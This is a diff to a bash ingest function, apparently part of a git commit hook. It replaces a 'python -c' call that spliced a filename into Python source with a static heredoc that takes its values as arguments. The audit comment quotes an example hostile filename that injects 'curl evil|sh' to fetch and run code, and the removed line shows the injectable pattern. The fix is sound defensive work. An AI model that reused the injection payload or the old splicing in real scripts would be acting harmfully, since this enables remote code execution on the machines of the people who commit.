@@ -102,7 +102,33 @@ ingest_one() {
             --rawfile c "$path" \
             '{workspace_id: $ws, path: $p, content: $c, language: $lang}')
     else
-        payload=$(python -c "import json,sys,pathlib; print(json.dumps({'workspace_id':'$WORKSPACE_ID','path':'$path','content':pathlib.Path('$path').read_text(encoding='utf-8'),'language':'$lang'}))" 2>/dev/null || true)
+        # Round-2 audit (HIGH): the jq-absent fallback used to splice
+        # $path / $WORKSPACE_ID / $lang straight into a `python -c`
+        # source string. A staged file named e.g.
+        #   '; __import__('os').system('curl evil|sh'); '.py
+        # broke out of the literal and ran arbitrary code at commit
+        # time — RCE triggered by `git commit` on a repo containing a
+        # hostile filename. Fixed: pass the values as argv via a
+        # single-quoted heredoc (bash does NOT expand $ inside), so
+        # the Python source is fully static and the path is data.
+        payload=$(python - "$WORKSPACE_ID" "$path" "$lang" <<'PYEOF' 2>/dev/null || true
+import json
+import pathlib
+import sys
+
+ws, path, lang = sys.argv[1], sys.argv[2], sys.argv[3]
+print(
+    json.dumps(
+        {
+            "workspace_id": ws,
+            "path": path,
+            "content": pathlib.Path(path).read_text(encoding="utf-8"),
+            "language": lang,
+        }
+    )
+)
+PYEOF
+)
     fi
     if [[ -z "$payload" ]]; then
         echo failed
